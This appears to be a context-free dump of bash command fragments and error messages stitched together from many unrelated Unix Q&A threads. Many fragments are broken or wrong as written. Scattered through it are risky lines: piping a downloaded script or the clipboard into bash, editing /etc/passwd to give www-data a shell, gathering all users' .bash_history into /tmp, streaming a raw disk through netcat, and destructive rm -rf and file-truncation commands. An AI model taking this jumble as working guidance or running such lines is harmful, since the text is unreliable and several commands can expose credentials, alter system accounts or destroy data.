quick and dirty
-e 's/(.*WARN.*)/\033[31;43;1m$1\033[0m\007/g;'
-e 's/(.*ERROR.*)/\033[33;41;1m$1\033[0m\007/g;'
perl -p
curl: (6) Could not resolve host: nt-dotfiles.tar.gz; nodename nor servname provided, or not known
curl -L -o nt-dotfiles.tar.gz https://api. ...
user.name:some/repo (master) $
export PS1="oh yeah"
export PS1='oh yeah'
command not found
python /path/to/it
/usr/local/bin/python-2.5 myscript.py
#!/usr/bin/env python
echo $PATH
return 5
man bash
vim 'ls -al'
info head
man head
Beat detection
Music information retrieval
set -v
set –n
set –v
rm -f ${FN}
bash -n <script>
sed -i
/bin/sh /home/user/script.sh
nice 10 php -q ./run_interactive_job.php batch_control_files/updateDB
nice -n 10 php -q ./run_interactive_job.php batch_control_files/updateDB
man nice
-e "pattern"
search term
echo "some text" | awk '/pattern to match/ && !/pattern to exclude/'
echo "hello there" | awk '/hello/ && !/there/'
echo "hello thre" | awk '/hello/ && !/there/'
echo "hllo there" | awk '/hello/ && !/there/'
echo "hello thre" | awk '(/hello/ || /hi/) && !/there/'
echo "hi thre" | awk '(/hello/ || /hi/) && !/there/'
echo "hello there" | awk '(/hello/ || /hi/) && !/there/'
echo "hi there" | awk '(/hello/ || /hi/) && !/there/'
get ????
man bash
$( )
$ cd abcde
bash 4.2
bind -q complete
bind -S
bind '"\C-i": complete'
for file in ~/Desktop/files.txt do mv $file ~/newfolder
brew info android-sdk
echo "foo" | less
cat barfile | baz
baz barfile
fpipe 'wget -O- www.example.com' baz
baz file
fpipe 'foo x' bar baz
foo x | bar | baz
fpipe 'wget -O- www.example.org | rev' baz
foo x > bar < baz
foo x |> baz | rev
cp somefile "$f"
dd … of="$f"
dirname $path
| basename
-bash: pandoc: command not found
man pandoc
sudo pandoc
sudo pandoc -s test.mdown -o test.html
Permission denied
env | grep ^PATH
tar: .: file changed as we read it
/usr/bin/ffmpeg/ffmpeg -i $1
inter 500
mp4box -inter 500 *
-maxdepth 1
-d ''
/myscript.sh -d "/var/log/" -c "test"
... for arg in "$@"; do ...
if [ $# -gt 0 ]; then echo "Usage ...
nano ~/.bash_profile OR nano $HOME/.bash_profile
source ~/.bash_profile
tput bold;
tput setaf 1
trap DEBUG
-n -5
noOfRows=$(cat $f | wc -l)
cat $f | wc -l
wc -l "$f"
relevantRows=$(expr $noOfRows - 5)
head -n $relevantRows $f | tee ${f%.txt}-Amended.txt
rm *Amended.txt
sudo su -;source .bashrc
source .bashrc
file libCLHEP-Exceptions-2.1.3.1.a
kill -- -$$
kill $$
kill -- -$$
pstree -p -g
grep '\$[0-9][0-9]\.[0-9][0-9]' money.txt
abc $15.64 xyz
chsh -s /bin/bash (or /usr/local/bin/bash) <my_username>
chsh: yppasswd_remote(): NIS password update failed
exec /bin/bash --login
man pages
sudo -E
sudo -E
Arch Linux
sudo env LD_LIBRARY_PATH=$LD_LIBRARY_PATH yourcommand
jan06.txt, feb06.txt, ..., dec07.txt
cat *.txt > data.txt
" ": magic-space
print >> n".txt"
bash script_c.sh
kill $PROCESS
avconv -y -i file1 ;  echo command finished
avconv -y -i file1 && echo command finished successfully.
avconv -y -i file1 || echo command finished but indicated failure!
man bash
set_up_cmd ls –l
history –s
$(basename $(tty))
Connection > SSH
Remote command
:map <C-x> :!exec_file %<CR>
:map <C-x> :!bash %<CR>
:set shell?
:!chmod +x %
watch -n 1 ps aux | grep something
bind -p
git instaweb
origin  git@github.abc.xyz.com:opp/wee.git (fetch)
git remote -v | head -n 1 | awk -F "@" '{print $2}' | awk -F " " '{print $1}' | sed 's/:/\//g' | sed 's/.git//g' | awk '{print "http://"$1}' | xargs open
start firefox $gbrowsevar
source baz
bar && source baz
Alt + q
vboxmanage controlvm NameOfRunningVM acpipowerbutton
time -p bash
{~/.bash_profile, ~/.bash_login, ~/.profile}
rm [argument_i] * [argument_j]
while read line
unset lastline
! [ -z "$lastline" ]
man test
-type f
mv -i
-o -iname "*.mov"
mindepth 2
Alfred Hitchcock
Alfred\ Hitchcock
2 ^ 36 / 1 billion = 69
sudo node_modules/pcap/examples/http_trace -f "tcp port 80"
man ls
| xargs ls
find … -print0 | xargs -0
find … -exec
--color always
(rm -f aaa*.string.php)
alias thing=whatever_you_want_to_happen
unzip -lqq <filename.zip>
xargs rm -rf
-type f
-type d
-exec rmdir -p {} \;
rmdir -p {}
2> /dev/null
rm -rf
treeseek name
tree -P '*name*'
sleep 1000 &
setopt CHECK_JOBS
nohup time my command with arguments && mv nohup.out my.log
(setsid "$@" &)
gc fixed Greg's bug
gc printf("%s", integervar) not a good idea
#!/usr/bin/env bash
sh -x test.sh
bash -–rcfile testrc -x test.sh
bash -–rcfile /dev/null -x test.sh
chmod +x test.sh
in .bashrc
git diff --cached --quiet -- "$SRC_PATTERN"
echo hellp
echo hellp
echo '
bind -p
osascript -e 'tell application "Terminal" to set current settings of window 1 to settings set "Grass"'
du -h | sort -h
find ... -printf "%s %p\n"
cd /some/dir
cd /usr/local
ls -l
du -h
$ du -hs * | sort -hr
locale charmap
iconv -l
sudo pmset sleep 0
sudo -k
sudo visudo
printf "%s" …
printf "%s" $GRAPH
type rvm | head -1
type rvm | head -1
type rvm
head -1
head -1
tail -n +1
tail -n +1
write error: Broken pipe
type rvm
head -1
type rvm
head -1
type rvm
history -a
CTRL+Z; bg; disown
-d -m
ssh hostname "bash --norc --profile"
stty sane
xsel -b
man xsel
~ $ ls -l
ls -l
avconv -i $1 -q 5 -qmin 0 -qmax 63  ${1%.*}.webm
-c:a libopus
alternatives --config "program-name"
alternatives --config program-name
cp /somedir/a\ file.png /somedir/another\ file.png /someotherdir/
cp: cannot stat 'a\\ file.png another\\ file.png': No such file or directory
var="/somedir/a\ file.png /somedir/another\ file.png"; cp $var /someotherdir/
cp: cannot stat 'a\\ file.png another\\ file.png': No such file or directory
cp: cannot stat 'file.png': No such file or directory
cp: cannot stat 'another\\': No such file or directory
cp: cannot stat 'file.png': No such file or directory
xargs -I
command source | tee >(command2) >(command3)
> /dev/null
awk … | paste … | bc
grep -c
alias my_command="/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.9.x86_64/bin/java"
source .bashrc
source .bashrc
PS1='\n\[\e[0;37m\][\[\e[0;35m\]\t\[\e[0;37m\]] \[\e[0;36m\]\u@\h \[\e[0;37m\][\[\e[1;34m\]\W\[\e[0;37m\]] \[\e[0;36m\]\$ \[\e[0m\]'
df: /root/.gvfs
CURR_DIR=echo pwd
CURR_DIR=echo pwd
ln -s 2013-02-*
export -p
sed -i '/www-data/s/false/sh/g' /etc/passwd
ifconfig -a
-E, -e, -w
-o pid,args
^[^ ]\+
split -v
exec /bin/zsh
exec [-cl] [-a name] [command [arguments]]
:r !ls
-bash: gzip: No such file or directory;
mysqldump -u user -h host -ppass database | gzip -9 > database.backup
mysqldump -u user -h host -ppass *--database* "db_name" | gzip -9 > "db_backup".backup.gz
man bash
set -o vi
set editing-mod vi
man bash
man zshbuiltins
ulimit -u
grep -l ulimit /etc/* $HOME/.* 2> /dev/null
exec sudo su
ps -au
dd if=/dev/sdX |  tr --squeeze-repeats "\000" "T"
wc -c
dd if=/dev/sdX |  tr --squeeze-repeats "\000" "T"
kill -USR1 <pid of dd>
memcmp(nullblock, buf+off, SECTOR)
memcmp(nullblock, buf+off, len-off<SECTOR : len-off : SECTOR)
find -type l
find -type l
-exec bash -c '...' {} \;
readlink -m "$0"
ln -f "$(readlink -m "$0")" "$0"
man find
man touch
info touch
find ~/tmp -type d
cat /path/dirlist.txt
find ~/Downloads/skydrive* -name *.jpg
find . -type f
cmp -s {} /path2/{}
-type d
-exec rmdir -p {} \;
rmdir -p {}
2> /dev/null
grep -c
grep -c
cat tfnislong.txt
cat ThisFileNameIsSoLong.txt
complete -o nospace -o filenames -F fuzzypath cd ls cat
rm -rf
rm -rf
|| command
if [ $? != 0 ]; then command; fi
set -o emacs
set -o emacs
set -o vi
cp file1.sh file2.sh
watch date
pstree -p
svn up
$ m 8.1 54321
my_command="svn up $ver_num; ./merge.py $ver_num $2"
echo "$my_command"
history -s "$my_command"
m 8 12345
m8 12345
cp -R $source $dest
history -s
ESC #
history -s -p $COMMAND
| sort | uniq -c | sort -rn
echo $PS1
if [ "$BASH" ]; then
$(cut -d : -f 1 $line)
head -n $NUMBER_OF_LINES
head --lines=100
head --lines=-100
tail --lines=100
tail --lines=-100
-o plusdirs -f -X '!*.txt'
xyz <TAB>
xyz d<TAB>
xyz dir
-o nospace
printf %q
-o filenames
git push
which git
git: 'credential-osxkeychain' is not a git command
ps $RSPID | grep rsync
kill $RSPID
sudo apt-get install terminator
terminator -p script
find . -type f -exec ls -lh {} \;
ls -lh
if(!k[2]){print "1K"}
else{printf "%.0f%s\n",k[1],k[2]}
sort | uniq -c
sort -hk 2
bash rotate_postfix_ip.sh
cd ~
$((1 + 2))
ls -l ~/Applications/Sublime\ Text\ 2/sublime_text
chmod +x ~/Applications/Sublime\ Text\ 2/sublime_text
echo $PATH
rm /usr/local/bin/subl
sudo rm /usr/bin/subl
CMD /C C:\run.bat
bash -l
zip --help
wd file1 file2
ps -o comm:1024 --pid 1391 --cols 1024 -w
cut -d "" -f 1 /proc/$pid/cmdline
gksudo synaptic
ps -ef|grep python
-C scriptname.py
laughing babies
smiling little children
Ubuntu 11.10
ssh-copy-id [user@]machine
-t" "
sort -k3 -k1 -k4 in.txt > newfile.txt
sort -k3,3d -k1,1d -k4,4d in.txt > newfile.txt
head -n-1
set -o vi
set -o emacs
vnstat -l
bash: parse_git_branch: command not found
sudo su -
sudo -i
su -
env_keep -=
sudo -V
expor PS1
export -n PS1
root1/folder1 root2/folder3 root2/folder4
ssh user@machine
su username
sudo su - user
sudo su -
sudo su
ssh user
info coreutils 'mkfifo invocation'
cat MyOutput >> NewRealFile
cat MyOutput
brew install postgresql
Summary /usr/local/Cellar/postgresql/9.2.3: 2824 files, 39M, built in 2.3 minutes
initdb /usr/local/var/postgres -E utf8
pg_ctl -D /usr/local/var/postgres -l logfile start
which psql
psql --version
psql (PostgreSQL) 9.1.5
-links 2
-k 2
cd /etc/s<TAB>
cd /etc/se<TAB>
sort -n
:%s/.*/& \\/
svn checkout
-type d
-type f
ssh u@host1 command
.profile, .bash_profile, .bashrc, .login
export READ=$READ:.profile
git clone
git-clone -u
#define SSH_SOURCE_BASHRC
./menu1.sh: line 105: =: command not found
./menu1.sh: line 7: e: command not found
./menu1.sh: line 79: r: command not found
until ($choice = q);
set -x
+ = q
which until
echo $SHELL
$choice = q
sed -n 'p;N'
sed -nf
find ... | zip -@
zip -@
#ifndef MACOS
grep -i hist \.*
history -a
man bash
fat = true
daemon /home/user/testftp.sh &
killproc $prog
kill $PID1
killall testftp.sh
kill $(pgrep testftp.sh)
pkill testftp.sh
pkill -P
kill $PID1
myapp run
[root@servername ~]$
PS1='[\u@\h \W]\$
cp -a /etc/skel /root
-bash-4.1# vim .bashrc
-bash-4.1# vim .bash_profile
[root@bvdirect-db-dev ~]#
echo $PATH
alias foo foo.sh
ln -s foo foo.sh
ls /Applications
IFS=$'\n'; for f in $(mdfind kMDItemContentType=com.apple.application-bundle); do printf %s "${f##*/}:"; defaults read "$f/Contents/Info.plist" CFBundleShortVersionString 2> /dev/null || defaults read "$f/Contents/Info.plist" CFBundleVersion 2> /dev/null || echo; done
rsync -rvn localdir targetdir
rsync -v ...
rsync -nia source destination | egrep -v "sending incremental file list" | egrep -v "^\."
rsync -nia source destination | egrep -v "sending incremental file list" | egrep -v "^(\.|<)"
rsync -nia source destination | egrep -v "sending incremental file list" | egrep -v "^(\.|>)"
rsync -nia source destination | egrep -v "sending incremental file list" | egrep -v "^\." | awk '{print $2}'
for a in /home/* ; do cp $a/.bash_history /tmp/$a.bash_history ; done
for a in * ; do echo $a ; done
for a in /home/* ; do echo $a ; done
for a in /home/* ; do cat $a/.bash_history >> /tmp/all-users_bash_history ; done
svn commit
svn add . --force
svn add
svn rm $( svn status | sed -e '/^!/!d' -e 's/^!//' )
svn status
svn commit
last -n1 | grep 'still logged in'
/bin/cat - > filename
runlevel 3
echo "You are not allowed to start X during the exam. This incident have been reported ..."
$ script.py &
$ script.py & disown
mintty bash -mc "commands &>/dev/null < /dev/null &"
git gui
sleep 60
sleep 60&
bash -c "sleep 60&"
mintty bash -c "sleep 60&"
mintty bash -mc "sleep 60&"
./foo.bat < /dev/null&
mintty bash -mc "./foo.bat < /dev/null&"
winpty bash -mc "./foo.bat&"
winpty bash -c "./foo.bat&" < /dev/null
winpty bash -mc "./foo.bat&" < /dev/null
winpty bash -c "./foo.bat" < /dev/null &
/c/Python39/python foo.py
sleep 60&
bash -c "sleep 60&"
./foo.bat < /dev/null&
mintty bash -mc "./foo.bat < /dev/null&"
mintty bash -mc "./foo.bat &> /dev/null < /dev/null&"
winpty bash -c "./foo.bat&" < /dev/null
winpty bash -c "./foo.bat&" &> /dev/null < /dev/null
winpty bash -mc "./foo.bat&" < /dev/null
winpty bash -mc "./foo.bat&" &> /dev/null < /dev/null
winpty bash -mc "./foo.bat" &> /dev/null < /dev/null &
seq 10
find . -type f  -exec grep -l foo {} \;
while read file
grep -q bar "$file" > /dev/null
[ $? -ne 0 ] && echo $file;
grep -r
top -u <username>
echo  :> /etc/anImportantFileWhichBelongsToSystem
touch /etc/testfile
lsattr file
if A < B
if B-A > 0
brew install bash
export PATH=
echo $PATH
trap debug
grep ... myfile.txt
grep -f patternfile …
grep -A 50 "Start"
whereis git-tf
which git-tf
alias name=value
alias rm=rm-i
man alias
source .bashrc
:help xterm-screens
-x file|directory|list
kill -17 [pid of running sleep.exe]
kill -l
ls ; touch test ; ls
touch test
rm -rf *.mp3 && echo "Success! All MP3s deleted!"
rm -rf *.mp3 || echo "Error! Some files could not be deleted! Check permissions!"
make bzimage &
mp3blaster sound.mp3
make mytestsoftware ; ls ; firefox ; make clean
man bash
ls a__
ls -l "filename1" "filename2" | cut -f8 -d' '
wc -c
tr -d ' '
$(md5 "$line" | cut -f2 -d'=' | sed -e 's/^[ \t]*//')
. ~/.bashrc
xmodmap ~/.speedswapper
stat -c %g <file>
stat -f %g <file>
stat -c %G <file>
stat -f %Sg <file>
\ls -l "$(dirname $TARGET_FILE)" | grep -v '^l' | grep " $(basename $TARGET_FILE)\$" | awk '{ print $3 }'
\ls -l "$(dirname $TARGET_FILE)" | grep -v '^l' | grep " $(basename $TARGET_FILE)\$" | awk '{ print $4 }'
grep -v '^l'
' '
ps aux
ps aux
grep -rni '."spacer">.' .
$ awk '/weight/{gsub(/weight=/, "")};{ value=$0*100; printf "weight=%s\n", value}' input
smbclient -L \\win7.ip.address.here
genrtr > genrtr.log
> genrtr.log
rm genrtr.log
genrtr | sed -ne '$w genrtr.log'
while true;
int   c;
FILE  *fp;
fp = fopen(
, "w");
if (fp == NULL)
while ((c = getc()) != EOF)
    putchar(c);
    if (c ==
    {
        fflush(fp);     //
        rewind(fp);
    }
    else
        putc(c, fp);
genrtr |
genrtr > genrtr.log
> genrtr.log
genrtr >> …
genrtr > …
rm genrtr.log
ps aux
sed -i '' 's/alma//g' f1
rm -v
export LANG=en_US:UTF-8
Mac OS X
% touch hølé
% ls -l htab
→ ls -l hølé
% -rw-r--r--  1 bob  wheel  0 Apr  2 18:49 hølé
export LANG="en_US.UTF-8"
chsh -s /bin/bash
printenv LANG
Terminal --help
echo 'bar bar'
source filename.sh
. filename.sh
chmod +x filename.sh; ./filename.sh
ls -l
Terminal sh ~/Desktop/testterm
set -o verbose
bash -lv
declare -f update_terminal_cwd
sudo opensnoop -n bash
ssh root@192.168.2.109 bash
ssh root@192.168.2.109 bash
ssh root@192.168.2.109 bash -l
ssh -t root@192.168.2.109 bash
bash -l
vi .bashrc
man bash
ls -l
man 1 bash
find ~  -maxdepth 1  -name '.bashrc'
vi ~/.bashrc
echo $PATH | grep ~/MyNewCoolProgramFolder
-maxdepth 1
man find
echo >> ~/.bashrc
vi .bashrc
vi ~/.bashrc
whereis CoolDetraveller
. /path/to/file
ls -l
/bin/real_ls -l "$@"
ls -l
printf "%s\n" "$ActiveIPs"
ssh admin@nas command
export PATH=...
to /etc/profile
ssh admin@nas
real address
ssh admin@nas /opt/bin/command-name
xargs -0
rm -f
| xargs -0 rm -f --
obsolete ImportantStuff
obsolete ImportantStuff
head -1 <out
new-session -d -s Super
send-keys -t Super: "command" "Enter"
send-keys -t Super: $'command\n'
[session]:[window id]:[pane #]
capture-pane -t Super: -S [start] -E [end] -p
tmux attach -t Super:
smartctl -H  /dev/sda1
smartctl -H  /dev/sda2
smartctl -H  /dev/sda
:help :!
> /dev/null
/etc/init.d/apache2 start
D:\cygwin\bin\mintty.exe -i /Cygwin-Terminal.ico -
C:\cygwin\bin\mintty.exe /bin/env CHERE_INVOKING=1 /bin/bash -l
crontab -l
crontab -e
su <user> -c <script> -magic-parameter
echo 'task goes here' | cat - todo.txt > temp && mv temp todo.txt
task goes here
task goes here
echo 'myfile.txt'...
echo myfile.txt...
tlp start
tlp start
python gameProgram.py
svn status -uq
echo "$status"
echo $status
unset PKG_CONFIG_PATH
locale -a
stty iutf8
man find
man pushd
man umask
man bash
man bash-builtins
manbash pushd
set -v
1 1
f 1
set -o emacs
ls /etc
$ rm *P*
ls -l P*
rm P*
inode number
kill %1
-sampling-factor '4:2:2'
-type TrueColor
source ~/.bashrc
customssh mylogin@remoteserver
source ~/.bashrc
Display Terminal as:
user vimrc file: "$HOME/.vimrc"
source ~/.bashrc
source ~/.bashrc
mplayer *
ls -1
ls -1 | sort
ls *
mplayer *
echo *
printf "%s\n" *
ls="ls -v"
set -o emacs
sudo tcpdump -In -i en0 host 10.0.0.2
history | grep iwconfig
Send options without primary recipient specified
nohup ./Annotation_Loop.sh
-W depend=afterok:$job
-hold_jid $job
unknown option -W
run_IntersectBed_1.sh $SGE_TASK_ID
qsub -t 1-3 -tc 1 Annotation_Loop.sh
-tc 1
ps -p $$
ls -l $(which sh)
man sh
man sh
set completion-ignore-case on
cat /dev/urandom > /nand/storage/testnand/test.raw
for i in $(seq 1 10000000); do echo $i >> /nand/storage/testnand/test.raw; done
-c number_of_bytes
--login -i
SET CHERE_INVOKING=1 & "C:\cygwin\bin\bash.exe --login -i" -cur_console:t:"cygwin terminal"
/dir "..."
Control Panel > System and Security > System
Advanced system settings > Environment variables
/dir "%CD%"
%ConEmuDrive%\cygwin\bin\bash.exe -new_console:C:"%ConEmuDrive%\cygwin\Cygwin.ico"
--login -i
set CHERE_INVOKING=1
mv -i
chromium-browser <url>
(chromum:xxxx) : Gtk-WARNING **: cannot open display:
export DISPLAY=:1
Client is not authrized to connect to the Server   (chromum:xxxx) : Gtk-WARNING **: cannot open display 1
man bash
gnome-terminal --tab -e "your command"
Commands for Moving
ext-color 172 \u
$( )
set mark-symlinked-directories on
ic: command not found
ic: command not found.
/usr/local/bin/bash ic
chmod  +x ic
#!/usr/local/bin/env bash
Profiles -> Profile Preferences
Title and Command
Run command as a login shell
Keyboard Layout
Caps Lock key behavior
bash: ~/bin/script.sh: No such file or directory
hash -r
ls -alt
ls -altr | cut -c 55-100
ruby -v
which ruby
set -o vi
bindkey -v
bind 'set revert-all-at-newline on'
ls -Al
ls -Al
your_command & sleep 20; kill $!
aptget install timeout
timeout -k 3m 14s your_command
perl -e "alarm 10; exec @ARGV" "Your_command"
$COMMAND 2>&1 >/dev/null & WPID=$!; sleep $TIMEOUT && kill $! & KPID=$!; wait $WPID
ebay-alarm 10 sec -c some command &
grep -A
awk '/pattern/ {for(i=0;i<number_of_lines;i++){print;getline}}' <filename>
sed -n '/pattern/ {p;n;p;n;p;...}' <filename>
x-terminal-emulator  "/home/pi/playvideos.sh"
Exec=lxterminal --command "/home/pi/playvideos.sh"
Exec=--command "/home/pi/playvideos.sh"
{ ... }
vared PATH
rm -i
vared $
mv foo.txt bar.txt
for i in *
-z $newname
cd -
cd - 2>&1 /dev/null
cd - &>/dev/null
cd - 2>/dev/null 1>&2
echo a b 2>&1 c </etc/fstab d
cd $someplace
cd -
$? = 1
$? = 0
Tilde Expansion
IF [ALREADY_RUN]
for myvid in "$FOLDER_SRC"/*
find … | while …
-q:a 4
ssh user@failingharddrivehost "some tar command | piped into something else"
rsync / new_partition:/wherever/you/want/
netcat -l -p 1234
tar --exclude='/dev'
rsync -zvr --exclude /dev/ / destination_computer_name_or_ip
nc -l 4242 | gunzip | cat > my_full_disk_backup_of_PC_named_foo
dd if=/dev/sda of=- bs=1M | gzip | nc -p 4242 name_of_the_destination
tar --exclude='/dev' --exclude='/proc'
rsync -avP --numeric-ids --exclude='/dev' --exclude='/proc' --exclude='/sys' root@failedharddrivehost:/ /path/to/destination/
-exec mv
less syslog
source <filename>
pbpaste | bash
sudo -v
awk 1
sed -n p
echo $'a\n\n'|printf %s\\n "$(cat)"
printf %s\\n
x=-nene;echo "$x"
-w "\n"
for f in /path/to/first.plist /path/to/second.plist; do defaults write "$f" itemName "Software Old Version"; done
find /folder -name '*.plist' -exec defaults write {} itemName "Software Old Version" \;
rm -r $(pwd); cd ..
; cd ..
mesg n
screen -x
jobs -l
bash: bg: job 3 already in background
sudo -u otheruser open /Applications/TextEdit.app
login username
su - otheruser
open /Applications/TextEdit.app
LSOpenURLsWithRole() failed with error -10810 for the file /Applications/TextEdit.app.
sudo su - otheruser -c /Applications/TextEdit.app/Contents/MacOS/TextEdit
_RegisterApplication(), FAILED TO establish the default connection to the WindowServer, _CGSDefaultConnection() is NULL.
sudo short_name -
ssh user@host bash -lc env
echo EXECUTED
export HI=THERE
PermitUserEnvironment = true
mkdir test_{a..z}
touch foo{0001..3}
sudo dhcpcd
sudo /usr/bin/dhcpcd
less eggs.py >> eggs.py
... > foo.txt
cp -rP <dir name> <new dir name>
du -sk
tilde expansion
cd ~
cd ~
printf '%d\n' "'$A"
cd //
cat $n"1" $n"2" $n"3" >> $n
$(crontab -l)
if [[ $(crontab -l | grep "^...$") =~ "^...$"]]
set -f
xmessage now
script -a yoursession.log
C^a X
C^a X
sudo nano /etc/default/grub
sudo update-grub
rm *
rm \*
rm '*'
rm \*
rm '*'
rm "*"
echo $0
exec -l
Set -e
|| true
set -e
chown man:root /var/cache/man || true
s3cmd ls --list-md5
s3cmd ls --list-md5sum
md5sum *.gz
pwd -P
$(pwd -P)
"$(/Users/michel/Desktop/anotherScript.sh data.txt)"
/usr/local/bin/growlnotify -t 'Fact' -m "$(/Users/michel/Desktop/anotherScript.sh data.txt)" -n 'myApp'
cp -r ~/.ipython ~/some/path/.ipython
unset -f fun1 fun2
echo $(($(date +%s%N)/1000000))
date +%s.%N
time command-goes-here >/dev/null 2>$1|sed rules-go-here
brew install coreutils
xargs grep
export CDPATH
export CDPATH=''
ssh git@github.com
ssh git@github.com
ssh -T git@github.com
man <command>
info <command>
<command> -h
<command> --help
/root/.scripts/peter-laptop-backup-launcher.sh daily
xauth merge /var/lib/kdm/:0.Xauth
:help :wqall
ls | grep -v "notes.txt" | xargs rm
echo "#include <knowledge.h>" | cat > foo.c
echo these are some arguments
rm file1 file2
xargs -L
echo 1 2
echo 1; echo 2
sync && echo 1 > /proc/sys/vm/drop_caches
grep -F
grep -F
Unique name.pdf
find /home/ -type f -name "*.pdf"
bash -x
!#/bin/bash -x
print . -type d ... | while read f; do
shopt -s globstar
man bash
g++ -o ./test.out ./test.cpp
: No such file or directory
: No such file or directory
: No such file or directory
echo $LS_COLORS
gnome-screensaver-command -d
ping -c 1 www.google.com
[ ]
which play
export PATH
man bash
chsh -s /bin/bash
$1 ~ /author/ { author=$2 }
shopt -s direxpand
echo $HOME/<tab>
echo /home/matt/
complete -r
echo $OLDP<tab>
echo $OLDPWD
C-x $
man zshzle
compgen -c
* * * * * myuser /usr/local/sbin/myscript
-I INPUT
> network_output.txt
tcpdump  port 5000 and '(tcp-syn)!=0' &> network_output.txt
set crypt_autoencrypt
-F /dev/null
-F ~/.yournewconfigurationfile
cd ~/folderA1
itermocil foo
typeset -a
sed 's/\s.*//
    ./.config
-maxdepth 1
permission denied
sort --human-numeric-sort
-c:grand total -k: 1Kb blocks -s: entry
sort -nr
(while ... < urls.txt)
( echo "=== ... ) > mktemp urltmpXXX
cp /usr/local/bin/reallylongincorrectfolder /home/myname/reallylong_and_correct_path
bind -P | grep '^backward-kill-word'
[[  branch ]]
set -g status-right '#(gitmux #{pane_current_path})'
print -P $PS1 $RPS1
print -P $PS1 $RPS1
which precmd
man zshmodules
C Client/Game/src/test/test.php
30 '!' C Client/test.js
31 '!' C Client/test2.js
32 '!' C Client/test3.js
file name with space
file n'ame
ps -C java
rm -rf /folder/*
-type d
grep -q ''
ps -u jack
run.sh parameter4 &
screen -d -r
ps -ef | grep parameter3
kill -9 PID
< <()
echo "[{query}]" > /tmp/out
cat /tmp/out
vancouver/news/vancouvers-march-second-annual-success and vancouver/news/vancouver-voices
| grep -o '".*": {'
| awk '\"(.*)\": {' --output='$1
find -exec
printf "%s\n" "$f" first
shopt -s globstar
eval "$@"
cd $origdir
global touch foo
vim .
vim . --large
vim ~/vimrc
L=t vim .
vim .
vim specific_file
vim --large
vim -- . --large
dirs -p
ctrl+b d
tmux ls
tmux new-session -s reasonable_session_name
tmux a -t reasonable_session_name
tmux a -t 1
ctrl+b c
ctrl+b window_number
of front window
Send To
Send To
man bash
-c string
This is Foo
This is Baz
Foo Bar Baz
"C:\cygwin\bin\bash.exe -c "source $0;read" %1 %*"
assoc .ext=ShellFile
mamp config
mamp restart
-bash: [config: command not found
find / -name "a*"
find / -name "a*"
find / -name "a*"
sleep 1
{ … }
find / -name 'a*'
--begin 3 10
rm '~'
rm \~
rm -- -i
rm -- *
rm -f *
mouse on
crontab -e
sudo adduser --system --disabled-login --disabled-password --group suser
sudo su -l suser -s /bin/bash
sudo su suser -c <COMMAND>
source ~/.bash_history
kill -9 $$
grep -F
grep -v "is" /path/to/file
grep -o "is" /path/to/file
egrep -v P*
egrep -v "P*"
grep -E
man rsync
rsync sourcefile user@dest:/dest/directory/
cat foo.txt | tee >(less)
cat foo.txt | tee /dev/tty | less
less -X
echo * | rm -f
echo *
rm -f
echo * | xargs rm -f
echo *
set -o vi
od -t d1
cut -d \  -f 2-
ls -Rhal
find . -maxdepth
ls -Rhal
ls -lh
echo "$JAVA_HOME"
-exec ls -lh {} \;
cd ..
cp ~/servers/apache-solr-3.6.2/example/webapps/solr.war usr/local/jakarta/apache-tomcat-5.5.36/webapps
cp ~/servers/apache-solr-3.6.2/example/webapps/solr.war usr/local/jakarta/apache-tomcat-5.5.36/webapps
cp ~/servers/apache-solr-3.6.2/example/webapps/solr.war /usr/local/jakarta/apache-tomcat-5.5.36/webapps
cp source destination
cp /servers/apac
cp ~/servers/apac
-bash: dos2unix: command not found
apt-cyg install dos2unix
echo cat
more tmp.txt
mp.x does not exist
echo TTT
mv ./*/*
mv ./*/* .
mv ./*/* .
mv /a/a1 ./a/a2 ./a/a3 ./a/a4 ./b/b1 ./b/b2 ./b/b3 ./b/b4 ./d/d1 ./d/d2 ./d/d3 ./d/d4 .
mv ./*/* this_is_a_file
mv /a/a1 ./a/a2 ./a/a3 ./a/a4 ./b/b1 ./b/b2 ./b/b3 ./b/b4 ./d/d1 ./d/d2 ./d/d3 ./d/d4 this_is_a_file
mv: target „this_is_a_file“ is not a directory
mv ./*/*
mv /a/a1 ./a/a2 ./a/a3 ./a/a4 ./b/b1 ./b/b2 ./b/b3 ./b/b4 ./d/d1 ./d/d2 ./d/d3 ./d/d4
Terminal > Features > Disable application keypad mode
Terminal > Keyboard
Function Keys and Keypad
VT100+ emulation
lipo -thin x86_64 /bin/bash -output /tmp/bash
-mtime +7
-mtime -7
ambiguous redirect
find: ‘ls’ terminated by signal 13
signal 13
ssh user@B some-health-check-command
ssh user@B some-command
App distinct
Color palette override
find -exec
wait $!
make_something_run.sh & echo $! > /var/run/someting.pid
su -s /bin/bash -c "${RED5_HOME}/${RED5_PROG}.sh & echo \$! > /var/run/red5.pid" $RED5_USER
cat -v /path/to/script
sudo apt-get --only-upgrade install libnet-amazon-ec2-perl
dpkg -s libnet-amazon-ec2-perl
sudo apt-get update
uname -a
chmod +x Script.sh
echo $?
find . -type f -print -exec cat {} \; | grep some string
Ubuntu, bash 4
ag 'some string' -l
history -p !-1
history -w
history -c
history -r
echo $REPLY >> $tmpFile; history -r $tmpFile;
history -s $REPLY;
tar tvfz jaws-complete-0.8.18.tar.gz
chmod -R go-w ...
sleep 1 2>/dev/null
sleep 1
time sleep 1 > /dev/null 2>&1
time (sleep 1 > /dev/null 2>&1)
(time sleep 1) > /dev/null 2>&1
grep -ohw 'Hello[0-9]*' *.txt
/media/foo/can haz/bar
cd "$Foo"
/media/foo/can haz/bar
a.txt b.txt
/media/foo/can haz/bar
zip foo.zip -qd "__MACOSX/*"
for file in "*.zip"; do zip $file -qd "__MACOSX/*"; done
find . -name "*.zip" -print0 | xargs -0 zip -qd "__MACOSX/*"
>word 2>&1
xscreensaver-command -deactivate
xscreensaver-command -exit
xscreensaver-command -exit
pkill xscreensaver
sudo killall -9 xscreensaver
DISPLAY=:0 xscreensaver -no-splash
DISPLAY=:0 xscreensaver-command -lock
make install
Use "."
bash -c
bash -c
bash -lc
set -o vi
0cwecho<esc>f a>><esc>
apt-get update && apt-get upgrade
apt-get update; apt-get upgrade
cmd1 && cmd2
cmd1; cmd2
cmd1 || cmd2
-X HEAD
my man.conf
./run.sh my\ man.conf
cannot open configuration file 'my
$ sh filename<tab>
complete -pr
man bashbuiltins
where -a [command]
$( ... )
` ... `
blah=$(cat /blah/$(blah)/blah)
perl -ne
rm -rf $HOME/.rvm*
\curl -L https://get.rvm.io | bash -s stable
source ~/.rvm/scripts/rvm
cd ~/apps/my_app
rvm use --install --create .
bundle install
file exists
file moved
file copied
file emptied
